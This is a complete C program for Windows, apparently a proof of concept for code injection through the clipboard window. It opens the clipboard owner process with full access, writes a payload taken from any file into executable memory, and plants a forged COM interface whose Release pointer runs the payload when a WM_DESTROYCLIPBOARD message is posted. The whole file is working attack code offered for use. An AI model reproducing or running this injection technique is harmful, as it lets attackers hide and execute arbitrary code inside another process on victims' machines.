
#define UNICODE
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// fake interface
typedef struct _IUnknown_t {
    // a pointer to virtual function table
    ULONG_PTR lpVtbl;
    // the virtual function table
    ULONG_PTR AddRef;
    ULONG_PTR QueryInterface;
    ULONG_PTR Release;       // executed for WM_DESTROYCLIPBOARD
} IUnknown_t;

VOID clipboard(LPVOID payload, DWORD payloadSize) {
    HANDLE     hp;
    HWND       hw;
    DWORD      id;
    IUnknown_t iu;
    LPVOID     cs, ds;
    SIZE_T     wr;
    
    // 1. Find a private clipboard.
    //    Obtain the process id and open it
    hw = FindWindowEx(HWND_MESSAGE, NULL, L"CLIPBRDWNDCLASS", NULL);
    GetWindowThreadProcessId(hw, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 2. Allocate RWX memory in process and write payload
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 3. Allocate RW memory in process.
    //    Initialize and write IUnknown interface
    ds = VirtualAllocEx(hp, NULL, sizeof(IUnknown_t),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    iu.lpVtbl  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
    iu.Release = (ULONG_PTR)cs;
    WriteProcessMemory(hp, ds, &iu, sizeof(IUnknown_t), &wr);
    
    // 4. Set the interface property and trigger execution
    SetProp(hw, L"ClipboardDataObjectInterface", ds);
    PostMessage(hw, WM_DESTROYCLIPBOARD, 0, 0);
    
    // 5. Release memory for code and data
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
  
DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}
  
int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: clipboard <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    clipboard(pic, len);
    return 0;
}
